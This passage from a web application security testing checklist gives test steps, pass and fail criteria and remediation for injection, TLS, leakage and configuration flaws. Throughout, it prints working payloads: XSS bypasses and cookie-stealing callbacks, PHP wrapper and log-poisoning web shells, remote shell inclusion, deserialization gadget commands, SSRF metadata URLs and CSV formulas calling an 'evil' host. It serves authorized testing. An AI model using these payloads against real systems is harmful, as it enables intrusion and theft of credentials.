| Inside `<textarea>` or `<title>` | Close the tag | `</textarea><img src=x onerror=alert(1)>` |
| Inside an HTML comment | Close the comment | `--><svg onload=alert(1)>` |

**When the payload is filtered**, the block is usually naive. Vary the shape rather than the idea:

```html
<sVg/OnLoad=alert(1)>              case mixing and a slash instead of a space
<svg onload=alert`1`>              no parentheses
<img src=x onerror=print()>        when the word alert is blocked
<details open ontoggle=alert(1)>   tags and handlers blocklists forget
<body onpageshow=alert(1)>
<img src=x onerror=&#97;lert(1)>   HTML entities, decoded inside attributes
<scr<script>ipt>alert(1)</scr</script>ipt>   strip-once filters re-form the tag
%253Cscript%253E                   double URL encoding against double-decoding bugs
```

**Blind XSS** is the one people never find. The payload is stored and fires in a screen you cannot see: an administrative dashboard, a log viewer, a support ticket console, a CRM, or a generated report. You get no reflection in your own response, so the only way to detect it is an out-of-band callback:

```html
"><script src=https://collab></script>
"><img src=x onerror="fetch('https://collab/?c='+document.cookie)">
```

Plant it in contact and support forms, profile fields, uploaded filenames, and the `User-Agent` and `Referer` headers, since both are routinely rendered into administrative log viewers. XSS Hunter and Burp Collaborator both work. A callback arriving days later is still valid, so record where and when you planted each payload in order to attribute it.

**DOM XSS** hides from server-side filters and scanners, because the fragment after `#` is never sent to the server:

```text
https://target/page#<img src=x onerror=alert(1)>
https://target/page#<svg onload=alert(1)>
```

Sources are `location.hash`, `location.search`, `document.URL`, `document.referrer`, `window.name` and `postMessage`. Sinks are `innerHTML`, `document.write`, `eval` and jQuery's `.html()`. A `<script>` element injected through `innerHTML` does not execute, so use event handlers. To find the sinks without reading every file, use the browser's global source search or DOM Invader, which traces source to sink automatically:

```bash
grep -rnE "innerHTML|document\.write|eval\(|\.html\(|location\.(hash|search|href)|window\.name|postMessage" ./js/
```

- **Pass**: output is encoded for the context it lands in and the payload renders as inert text.
- **Fail**: the payload executes. Reflection alone is not a fail, since input encoded on display is handled correctly even though you can see it in the response. Confirm by execution rather than by reflection.
- **When `alert()` does not fire, do not close it yet**: a Content Security Policy may be blocking inline script, and modern browsers suppress `alert()` in sandboxed iframes. Prove execution another way, with `document.title='xss'`, a visible DOM change, or a callback. A CSP that is bypassable anyway (`unsafe-inline`, a wildcard host, a JSONP endpoint in the allowlist) is worth reporting separately.
- **Evidence**: a screenshot or video of execution plus the request. For impact, show `fetch('https://collab/?c='+document.cookie)` landing a callback, and where `HttpOnly` blocks cookie theft, demonstrate a state-changing request fired as the victim instead. For blind XSS, the callback log entry and the plant location.

### INJ-07: File inclusion

**Test:** in parameters that load files or pages, inject a local path for LFI or a remote URL for RFI. On a PHP target, run the wrappers before anything else, because they turn "I can read `/etc/passwd`" into "I have your source code and your database credentials":

```text
php://filter/convert.base64-encode/resource=index.php     start here
php://filter/read=string.rot13/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
expect://id
zip://uploads/avatar.zip%23shell.php
phar://uploads/avatar.jpg/shell.txt
file:///etc/passwd
http://attacker/shell.txt                                 RFI proper
```

The base64 filter is the highest-yield first probe. An included PHP file normally executes and returns nothing useful, while the filter returns it encoded as text, so you get server-side source and usually database credentials with it.

`data://` and remote inclusion both need `allow_url_include` enabled, which is off by default on modern PHP, so a failed RFI attempt is not evidence that the parameter is safe. `zip://` and `phar://` chain off a file upload, and `phar://` also triggers deserialization on the way through.

Without a usable wrapper, there are two routes from a plain file read to code execution:

- **Log poisoning**: send `<?php system($_GET['c']); ?>` in the `User-Agent`, then include `/var/log/apache2/access.log` and append `&c=id`.
- **`/proc/self/environ`**: the same idea, poisoned through the `User-Agent`, wherever it is readable.

If the application appends an extension, try dropping it (`?file=index`), and on legacy PHP a null byte truncates the rest of the string.

- **Pass**: the file parameter maps to an allowlist of permitted values, and wrappers and remote schemes are rejected.
- **Fail**: local file contents returned, source code returned base64-encoded through a filter wrapper, or remote content included and executed.
- **Evidence**: the response containing the included file, plus the decoded source where the filter wrapper worked.

### INJ-08: Insecure deserialization

This turns up wherever the application hands you a serialized object and trusts it back: cookies, hidden fields, cache and session parameters, API tokens, and message queue payloads. The impact is usually straight remote code execution.

**Test:** fingerprint the blob by its first bytes, decoding base64 first:

| Stack | Raw prefix | Base64 starts with |
|---|---|---|
| Java | `\xac\xed\x00\x05` | `rO0AB` |
| PHP | `O:4:"User":` or `a:2:{` | `Tzo0` or `YToy` |
| .NET | | `AAEAAAD/////` |
| Python pickle | `\x80\x04\x95` | `gASV` or `gAJ` |
| Ruby Marshal | `\x04\bo:` | `BAhvOg` |

Test before weaponising. Flip a single byte in the middle of the blob and resend. A deserialization exception (`java.io.StreamCorruptedException`, `unserialize(): Error at offset`) confirms the server is deserializing attacker-controlled data, and the stack trace is a separate finding under `LEA-01`. Then prove it out of band, never with a destructive command:

```bash
java -jar ysoserial.jar CommonsCollections6 'ping -c1 collab' | base64 -w0
phpggc Laravel/RCE1 system 'ping -c1 collab' -b
ysoserial.net -g TypeConfuseDelegate -f Json.Net -c "nslookup collab"
```

PHP object injection without a library gadget looks like `O:4:"Test":1:{s:3:"cmd";s:2:"id";}`. Burp's Java Deserialization Scanner and Freddy flag candidates passively, so run them across the sitemap while you work on something else.

- **Pass**: no serialized objects are accepted from the client, or they are signed, verified before parsing, and type-restricted.
- **Fail**: a tampered blob raises a deserialization exception, or a gadget chain produces the out-of-band callback.
- **Evidence**: the tampered request and the exception, plus the callback for the gadget chain and a video.

### INJ-09: Host header injection

The application builds absolute URLs (password reset links, email links, canonical tags, asset paths) from the `Host` header you supplied instead of from server configuration. Change the header and the application generates a link pointing at your server. Paired with the reset flow in `AUT-04`, this is the cleanest account takeover available: the victim's real reset token gets mailed out with your hostname in front of it, and the moment they click, you have it.

**Test:** most applications validate `Host` and forget the proxy headers, so work through the variants:

```http
POST /password-reset HTTP/1.1
Host: collab

Host: target.com
X-Forwarded-Host: collab

Host: target.com
X-Host: collab

Host: target.com:collab
```

Also try an absolute URL in the request line with a mismatched header, since some stacks trust one and some the other:

```http
GET https://collab/password-reset HTTP/1.1
Host: target.com
```

Then escalate in order: reset link poisoning first, which is account takeover; then cache poisoning, if the poisoned URL lands in a response served to everyone else; then routing-based SSRF, where the front end proxies to whatever host you name; then authentication bypass against admin panels gated on an internal hostname.

- **Pass**: absolute URLs are built from server-side configuration, the `Host` value is validated against an allowlist, and proxy headers are stripped at the edge.
- **Fail**: your hostname appears in a generated link, an email, or a cached response.
- **Evidence**: the tampered request plus the received email showing the attacker host in the reset link, with a video where it reaches takeover.

### INJ-10: Header injection

Carriage return and line feed separate HTTP headers. Where your input lands in a response header without being stripped, you can add headers or split the response.

**Test:** inject CRLF into parameters reflected into a response header, and into name and subject fields on any email form:

```text
/redirect?url=https://site/%0d%0aSet-Cookie:%20sessionid=attacker
/page?lang=en%0d%0aX-Injected:%20true
```

Redirect targets, cookie values and locale headers are where this lives.

- **Pass**: CRLF is stripped or encoded and no header can be added.
- **Fail**: your injected header appears in the response, or an injected `Bcc:` reaches a real recipient through an email form.
- **Evidence**: the response showing the injected header, or the resulting email.

### INJ-11: Open redirect

**Test:** find redirect parameters (`?url=`, `?next=`, `?returnUrl=`), point them at an external domain, and follow the redirect.

- **Pass**: redirects are restricted to allowlisted internal targets.
- **Fail**: the application redirects to an arbitrary external URL.
- **Evidence**: the request and response showing the off-site redirect. On its own this is a phishing aid. Check whether the host is OAuth-allowlisted (`AUT-10`), because that turns the same bug into account takeover.

### INJ-12: Path traversal

**Test:** in file and path parameters, inject `../../../../etc/passwd`, then work through encodings when the plain version is filtered: `..%2f`, double encoding, Windows separators, and `....//` against a filter that strips `../` once without looping.

- **Pass**: the path is resolved and canonicalised, then confirmed to sit inside the intended directory.
- **Fail**: contents of a file outside the intended root are returned.
- **Evidence**: the response containing the traversed file.

### INJ-13: File upload handling

**Test:** two questions. Which extensions get through, and does the upload directory execute anything.

Upload disallowed types (`.php`, `.jsp`, `.aspx`) and try content-type spoofing, magic bytes and case variation. Then try double extensions, which work because the filter and the web server disagree about which extension counts. A naive filter reads the last extension and allows `.jpg`, while a misconfigured server executes on the first one:

```text
shell.php.jpg          shell.asp;.jpg        shell.php%00.jpg
shell.php.             shell.pHp             shell.phtml
```

Retrieve the uploaded file afterwards and try to execute it, since that is what makes this code execution rather than a filter weakness. Upload an SVG containing script separately, because that is stored XSS delivery even where nothing executes server-side.

- **Pass**: only allowlisted extensions are accepted, validated server-side, with files renamed on arrival, stored outside the web root, and served from a location that cannot execute code.
- **Fail**: a dangerous extension is accepted, or an uploaded file executes when retrieved.
- **Evidence**: the upload request and the retrieval showing the file executing, with a video.

### INJ-14: Server-Side Request Forgery

**Test:** do not just point it at a random internal API. Escalate in order:

1. **Detect** with an out-of-band URL. A callback confirms SSRF even when nothing is returned, which is the only way to find the blind variety.
2. **Loopback**: `http://127.0.0.1/` and `http://localhost:port/` to scan internal services.
3. **Cloud metadata**, the highest impact target: `http://169.254.169.254/latest/meta-data/` on AWS and `http://metadata.google.internal/` on GCP, both of which can hand over cloud credentials.
4. **Internal ranges**: `10.x`, `192.168.x`, `172.16-31.x`.

Look for it in any parameter taking a URL or hostname: webhooks, import-from-URL features, avatar fetching, link previews, XML parsers, and HTML-to-PDF generators, which are reliably overlooked.

- **Pass**: outbound requests are restricted to an allowlist, with link-local and internal ranges blocked.
- **Fail**: the server fetches an internal or metadata URL, whether the response is returned or only confirmed by callback.
- **Evidence**: the internal response, or the out-of-band hit. Cloud credentials retrieved from a metadata endpoint need a video.

### INJ-15: CSV formula injection

Where the application exports user data to CSV or XLSX, any cell starting with `=`, `+`, `-` or `@` is treated as a formula by the spreadsheet application. An attacker stores a formula in an ordinary field such as their name, an administrator exports the report later, and the formula runs on the administrator's machine.

**Test:** put these in fields you suspect get exported, then trigger the export and open the file:

```text
=HYPERLINK("http://evil/?"&A1,"click")
=cmd|'/c calc'!A1
@SUM(1+1)*cmd|'/c calc'!A1
```

- **Pass**: exports neutralise leading formula characters by prefixing or escaping them.
- **Fail**: the spreadsheet treats the cell as a live formula.
- **Evidence**: the exported file showing the formula cell. Confirm an export feature exists before spending time here.

### INJ-16: Framing and clickjacking

An attacker loads the target in an invisible iframe on their own page, overlays fake interface elements, and lines an invisible button up under the cursor. The victim clicks what looks like the attacker's page and actually clicks the framed application, acting with their own logged-in session.

**Test:** check the response for `X-Frame-Options` or a `frame-ancestors` directive in the CSP, then try to frame it:

```html
<html><body><h1>Click here to win</h1>
<iframe src="https://target.com/account/settings" width="800" height="600"></iframe>
</body></html>
```

- **Pass**: framing is denied and the iframe stays blank.
- **Fail**: the application renders inside the iframe.
- **Evidence**: the missing header and a screenshot of the proof of concept page with the application framed.

## TLS: Transport Security

One scan drives this whole section, and the skill is in reading the output rather than running the tool:

```bash
testssl.sh --full --logfile testssl_target.txt https://target
sslscan target:443
nmap --script ssl-enum-ciphers -p 443 target
```

Read every block. The most commonly missed finding lives in the last one.

### TLS-01: Protocol versions

**Test:** the protocol block of the scan output.

```text
SSLv2      not offered (OK)
SSLv3      not offered (OK)
TLS 1      offered (deprecated)
TLS 1.1    offered (deprecated)
TLS 1.2    offered (OK)
TLS 1.3    offered (OK)
```

- **Pass**: only TLS 1.2 and 1.3 are offered.
- **Fail**: any of SSLv2, SSLv3, TLS 1.0 or TLS 1.1 shows as offered.
- **Evidence**: the protocol support block from the saved log file.

### TLS-02: Cipher strength

**Test:** read the name and the bit count on every cipher line, since the name encodes the algorithms.

```text
xc02f  ECDHE-RSA-AES128-GCM-SHA256   AESGCM  128   good, AEAD
xc013  ECDHE-RSA-AES128-CBC-SHA      AES     128   CBC, so Lucky13 and BEAST
x0a    DES-CBC3-SHA (3DES)           3DES    112   SWEET32
```

- **Pass**: every offered cipher is AEAD (GCM or ChaCha20-Poly1305), at least 128-bit, with ECDHE key exchange for forward secrecy.
- **Fail**: any cipher name containing `CBC`, plus RC4, DES, 3DES, export, NULL and anonymous ciphers, and anything under 128 bits.
- **Evidence**: the cipher list with bit strengths.

> **Gotcha:** 3DES is nominally 168-bit but effectively 112-bit and broken by SWEET32, so flag it even though the number looks acceptable.

### TLS-03: Named cipher vulnerabilities

**Test:** the vulnerability block, read line by line. This is where a finding slips past someone who stopped at the cipher list.

```text
SWEET32 (CVE-2016-2183)      VULNERABLE, uses 64 bit block ciphers (3DES)
LUCKY13 (CVE-2013-0169)      potentially VULNERABLE, uses CBC ciphers
POODLE, SSL (CVE-2014-3566)  not vulnerable (OK)
ROBOT                        not vulnerable (OK)
Heartbleed (CVE-2014-0160)   not vulnerable (OK)
```

- **Pass**: every line reports not vulnerable.
- **Fail**: every line reading `VULNERABLE`, `potentially VULNERABLE` or `NOT ok` is a separate finding.
- **Evidence**: the full vulnerability block. Use the log file rather than a screenshot, since colour codes are stripped and the words are what matter.

### TLS-04: Certificate validity

**Test:**

```bash
echo | openssl s_client -connect target:443 -servername target 2>/dev/null \
  | openssl x509 -noout -dates -subject -issuer
```

- **Pass**: current, issued by a trusted CA, CN or SAN matching the hostname, signed with SHA-256 or better.
- **Fail**: expired, self-signed, untrusted issuer, hostname mismatch, revoked, or a SHA-1 or MD5 signature.
- **Evidence**: the certificate details output.

### TLS-05: End-to-end transport

**Test:** capture all traffic and look for two things: anything sensitive sent over plaintext HTTP, and any sensitive value sitting in a URL. Then trace one sensitive flow end to end, watching for a scheme change partway through.

- **Pass**: credentials, tokens and personal data travel only over TLS, nothing sensitive appears in a URL, and no sensitive flow mixes HTTP and HTTPS at any point.
- **Fail**: a secret sent over HTTP, a session token or account number in a query string, or a flow that downgrades mid-session, including mixed content on a secure page.
- **Evidence**: the traffic capture showing the plaintext transmission or the sensitive value in the URL.

## LEA: Information Leakage

The goal is that the application gives an attacker nothing for free.

### LEA-01: Error handling

**Test:** force errors with malformed input, wrong data types, oversized values, broken parameters and requests for pages that do not exist.

- **Pass**: generic error pages with no technical detail.
- **Fail**: a stack trace, a database error, a framework debug page, or a component version shown to the user.
- **Evidence**: the detailed error response.

### LEA-02: Internal path disclosure

**Test:** provoke path-leaking errors, then grep everything you have captured. PHP applications leak paths readily when you send an array where a string is expected (`?param[]=x`).

```bash
grep -inE "/var/www|/home/|/usr/local|inetpub|webapps|WEB-INF|on line [0-9]+|DocumentRoot" ./responses/
```

- **Pass**: no internal filesystem paths appear in any response.
- **Fail**: absolute paths leaked in errors, parser messages or comments.
- **Evidence**: the response showing the path.

### LEA-03: Server-side source exposure

**Test:** four distinct routes, worth running all of them.

- **Backup and temporary files**: for each known file, request `login.php.bak`, `login.php~`, `login.php.old`, `login.php.swp` and `login.php.txt`. Fuzz with a wordlist rather than guessing.
- **Exposed version control**: `/.git/HEAD`, `/.git/config`, `/.svn/entries`, `/.DS_Store`. A readable `.git` directory means the whole repository can be reconstructed with `git-dumper`.
- **Source maps**: check the end of every bundle for `//# sourceMappingURL=` and fetch the map.
- **Configuration files**: `.env`, `web.config`, `appsettings.json`, `Dockerfile`, `WEB-INF/web.xml`.

- **Pass**: only presentation code reaches the browser.
- **Fail**: server-side source, a readable repository, or a usable source map is retrievable.
- **Evidence**: the leaked source, the dumped repository, or the reconstructed files.

### LEA-04: Version disclosure

**Test:** response headers, service banners, default error pages, and version-revealing files.

```bash
curl -sI https://target | grep -iE "server|x-powered-by|x-aspnet|x-generator|via"
nmap -sV -p 80,443 target
```

- **Pass**: version information is suppressed or generic.
- **Fail**: a precise version disclosed anywhere, which turns a broad search for an attacker into a targeted one.
- **Evidence**: the headers, banners, or the version-leaking page.

### LEA-05: Username harvesting

**Test:** compare responses for accounts that exist against accounts that do not, across login, registration and password reset. Check three things: the message text, the status code, and the response timing.

- **Pass**: responses are uniform regardless of whether the account exists, with the reset flow always answering "if that account exists, we have sent an email".
- **Fail**: any difference in message, status code or timing that reveals whether an account exists.
- **Evidence**: the two differing responses side by side, with timings if that is the distinguishing signal.

### LEA-06: Default and generic accounts

**Test:** check for default or sample accounts (`admin`, `guest`, `test`, `sa`, platform defaults) and try to log in. Separately, look for shared accounts that multiple people use, and for identifiers that encode privilege (`admin_`, `mgr01`, sequential administrative IDs).

- **Pass**: no default accounts remain active, every account maps to one identifiable person, and identifiers are neutral.
- **Fail**: a default account is still usable, generic shared accounts exist, or an identifier reveals privilege level.
- **Evidence**: the successful login or the account list.

## DAT: Data Handling

### DAT-01: Client-side storage

**Test:** inspect cookies (noting which are persistent), `localStorage` and `sessionStorage` for personal data, credentials or tokens.

- **Pass**: no sensitive data in persistent cookies or web storage.
- **Fail**: personal data, credentials or long-lived tokens found in client storage.
- **Evidence**: the storage inspection screenshot.

### DAT-02: Response caching

**Test:** read the caching headers on responses carrying sensitive data. After logging out, press Back and check what still renders from cache.

- **Pass**: sensitive responses carry `Cache-Control: no-store, no-cache, must-revalidate`.
- **Fail**: sensitive pages are cacheable, or a logged-out browser still renders them from cache.
- **Evidence**: the cache headers and the post-logout cached page.

### DAT-03: Autocomplete on sensitive fields

**Test:** inspect the HTML of forms collecting payment or identity data.

- **Pass**: autocomplete disabled on payment card and identity fields.
- **Fail**: autocomplete enabled on those fields.
- **Evidence**: the form HTML. Browsers ignore this attribute in many cases, so treat it as minor except on payment fields.

### DAT-04: Data at rest and minimisation

**Test:** compare what is collected and stored against what the function actually needs, and check whether sensitive identifiers are encrypted. Black-box, infer from any response exposing these in plaintext.

- **Pass**: only necessary data is stored, sensitive identifiers are encrypted, and a retention policy exists and is applied.
- **Fail**: unnecessary sensitive data retained, the classic example being card verification values, which should never be stored. Plaintext storage of identity or payment data fails too.
- **Evidence**: the data inventory, or a response leaking stored extras.

## CFG: Configuration

### CFG-01: HTTP methods

**Test:**

```bash
curl -i -X OPTIONS https://target
curl -i -X TRACE https://target
curl -i -X PUT https://target/test.txt -d x
```

- **Pass**: only the required methods are enabled.
- **Fail**: `TRACE` enabled, which allows cross-site tracing, or `PUT`, `DELETE` or `CONNECT`, which allow file manipulation.
- **Evidence**: the `OPTIONS` response, or a successful `PUT` or `TRACE`.

### CFG-02: Directory listing

**Test:** request directories with no index file: `/images/`, `/js/`, `/uploads/`, `/backup/`.

- **Pass**: 403 or a redirect, with no file list.
- **Fail**: the server returns an automatic index of the directory contents.
- **Evidence**: the directory listing page.

### CFG-03: Configuration file retrieval

**Test:** try to reach configuration and system files through the application, both directly (`/web.config`, `/.env`, `/application.properties`, `/WEB-INF/`) and through traversal from `INJ-12`. Separately, test whether the upload directory executes scripts.

- **Pass**: configuration files are unreachable and upload directories are not executable.
- **Fail**: any configuration file is retrievable, or a directory is both writable and executable.
- **Evidence**: the retrieved file, or the upload-and-execute proof.

### CFG-04: Vendor defaults

**Test:** try default credentials on every administrative interface, device and service, and default SNMP community strings.

```bash
snmpwalk -v2c -c public target
```

- **Pass**: all defaults changed.
- **Fail**: any default credential or community string works.
- **Evidence**: the successful default login, or the SNMP walk output.

### CFG-05: Directory service configuration

**Test:** where LDAP is reachable, attempt an anonymous bind, and confirm the application connects over LDAPS or StartTLS rather than plaintext 389.

```bash
ldapsearch -x -H ldap://host -b "dc=example,dc=com"
```

- **Pass**: anonymous bind rejected, and the connection is encrypted.
- **Fail**: an anonymous bind returns directory data, or bind credentials cross the network in the clear.
- **Evidence**: the `ldapsearch` output, and the configuration or packet capture for the transport.

### CFG-06: HTML5 features

**Test:** where these features are in use:

- **CORS**: send an `Origin` header and read the response. `Access-Control-Allow-Origin: *` or a reflected origin, combined with `Allow-Credentials: true`, is a misconfiguration.
- **postMessage**: receivers must validate `event.origin`.
- **Web storage**: covered by `DAT-01`.
- **WebSockets**: `wss://` and origin-checked.

- **Pass**: origins are validated rather than reflected, message receivers check their sender, and WebSockets are encrypted.
- **Fail**: wildcard or reflected CORS with credentials, an unchecked `postMessage` receiver, or a plaintext WebSocket.
- **Evidence**: the request and response showing the reflected origin, or the source of the unchecked handler.

### CFG-07: Patch level

**Test:** map the versions from `REC-01` and `LEA-04` to known CVEs, and run `retire.js` over the client-side libraries, which are the components most likely to be years out of date.

- **Pass**: components are current, with no known-vulnerable versions in use.
- **Fail**: any outdated component with a published CVE.
- **Evidence**: the version and the CVE references.

## Severity

Roughly how these tend to rate, as a starting point rather than a formula. Context moves things in both directions:

| Severity | Checks |
|---|---|
| Critical | `AUT-01`, `AUT-08`, `AUT-10`, `AUZ-01` on sensitive data, `AUZ-03`, `INJ-02`, `INJ-03`, `INJ-04`, `INJ-08`, `INJ-09`, `INJ-13` reaching execution |
| High | `SES-03`, `SES-04`, `INJ-06` stored and blind, `INJ-07`, `INJ-14`, `LEA-03` |
| Medium | `SES-02`, `SES-10`, `TLS-02`, `TLS-03`, `INJ-06` reflected, `INJ-16`, `LEA-05` |
| Low | `LEA-04`, `DAT-03`, `SES-02` path scope, `AUT-11` where the session model is otherwise sound |

Capture evidence for the checks that passed as well as the ones that failed. A record showing a check was run and held is worth as much as the finding next to it, and months later it is the only thing that proves the check happened at all. Record a video for anything critical, since a request and response pair rarely conveys a multi-step bypass on its own.

Where a check does not apply, record why rather than leaving a bare "not applicable". "No self-registration", "no web services", "no spreadsheet export" and "password policy enforced by the directory" are all legitimate, and each of them tells the next reader something.

## Remediation

Most of the list collapses into a handful of principles. The defences differ by class, but the failures repeat.

- Validate input server-side against an allowlist of expected characters, length and type. Client-side validation is a usability feature, not a security control.
- Use parameterised queries for every database interaction. For clauses that cannot be parameterised, such as `ORDER BY`, map user input to a fixed allowlist of column names.
- Cast input to the expected type before it reaches a NoSQL query, so an operator object can never arrive where a string was expected.
- Encode output for the context it lands in rather than filtering input. Escape for HTML, attributes, JavaScript and URLs separately, since each has different dangerous characters.
- Avoid passing user input to a shell at all. Where a system call is unavoidable, use an API that takes an argument array rather than a command string.
- Never deserialize attacker-controlled data. Where the design requires it, sign the payload, verify the signature before parsing, and restrict which types may be instantiated.
- Build absolute URLs from server-side configuration, never from the `Host` header or any forwarded header, and strip proxy headers at the edge.
- Enforce authentication and authorization server-side on every request, checking the object and the action, not just the route.
- Validate OAuth `redirect_uri` against an exact-match allowlist, require and verify `state`, use authorization code with PKCE, and never link accounts on an unverified email claim.
- Set `HttpOnly`, `Secure` and `SameSite` on session cookies, regenerate the session identifier on login, and invalidate sessions server-side on logout.
- Resolve and canonicalise file paths, then confirm the result sits inside the intended directory. Store uploads outside the web root, rename them on arrival, and serve them from a location that cannot execute code.
- Restrict outbound requests to an allowlist of destinations, and block link-local and internal ranges to keep SSRF away from cloud metadata.
- Disable introspection in production GraphQL, authorize inside every resolver, and cap query depth, complexity and batch size.
- Return generic error messages to users, log the detail server-side, and keep responses uniform whether or not an account exists.
- Serve everything over TLS 1.2 or higher with AEAD ciphers only, and disable CBC, 3DES, RC4 and every protocol below TLS 1.2.
- Remove version banners, default accounts, sample content and unused services, and keep every component patched, including the client-side libraries.
